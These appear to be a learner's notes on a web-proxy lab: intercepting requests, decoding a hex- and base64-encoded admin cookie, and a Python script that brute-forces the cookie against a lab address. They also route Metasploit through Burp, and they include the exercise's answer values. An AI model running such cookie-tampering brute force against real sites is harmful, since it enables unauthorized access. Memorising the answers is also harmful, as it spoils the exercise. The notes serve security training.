Q1.  The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.

```
step 1 

intercept the request in the proxy 

step 2 

enable the button

step3 

do intercept the response and forward the request 

step 4 

you will get a request with getflag=true 

step 5

forward to repeater 

step 6

send the request try some times until it reveals the flag
 



```

![](Attachments/Pasted%20image%2020260918103355.png)

Q2. The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31-characters. Submit the value as the answer.

```
step 1 

go to application in the dev tools and grab the cookie 

4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d

step 2

0-9 a-f 

decode using hex as it only has these characters

echo '4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d' | xxd -r -p
M2RhYzkzYjhjZDI1MGFhOGMxYTM2ZmZmYzc5YTE3YQ== 

step 3 

now we know its a base 64 

lets decode: 




```

![](Attachments/Pasted%20image%2020260918103934.png)


```
3dac93b8cd250aa8c1a36fffc79a17a

```

Q3. Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character. So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above. (You may use the "alphanum-case.txt" wordlist from Seclist for the payload)

```
import base64
import hashlib
import requests
import string

URL = "http://154.57.164.82:31867/admin.php"
BASE = "3dac93b8cd250aa8c1a36fffc79a17a"
SESSION = "rdlthdsi7qga6v0rjs3h4oqb5e"

# alphanum-case is effectively what we need here
chars = string.ascii_letters + string.digits

s = requests.Session()
s.cookies.set("PHPSESSID", SESSION)

baseline = s.get(URL, timeout=10)
baseline_hash = hashlib.sha256(baseline.content).hexdigest()
baseline_len = len(baseline.content)

print(f"Baseline: {baseline.status_code}, {baseline_len} bytes, {baseline_hash}")
print(f"Testing {len(chars) * (len(BASE)+1)} candidates...")

count = 0

for char in chars:
    for pos in range(len(BASE) + 1):

        candidate = BASE[:pos] + char + BASE[pos:]

        # candidate -> Base64 -> hex
        b64 = base64.b64encode(candidate.encode()).decode()
        encoded = b64.encode().hex()

        r = s.get(
            URL,
            cookies={
                "cookie": encoded,
                "PHPSESSID": SESSION
            },
            timeout=3
        )

        count += 1

        if count % 100 == 0:
            print(f"[*] Tested {count}/{len(chars)*(len(BASE)+1)}")

        h = hashlib.sha256(r.content).hexdigest()

        if r.status_code != baseline.status_code or \
           len(r.content) != baseline_len or \
           h != baseline_hash:

            print("\n[+] DIFFERENT RESPONSE!")
            print("Character:", repr(char))
            print("Position :", pos)
            print("Candidate:", candidate)
            print("Base64   :", b64)
            print("Hex      :", encoded)
            print("Status   :", r.status_code)
            print("Length   :", len(r.content))
            print(r.text[:1000])

```

```

```

Q4. You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?

```
step 1

burp runs in localhost:8080

set the msf proxy to 127.0.0.1:8080

step 2 

send the request

and you can see the ### /XXXXX/administrator/ 


```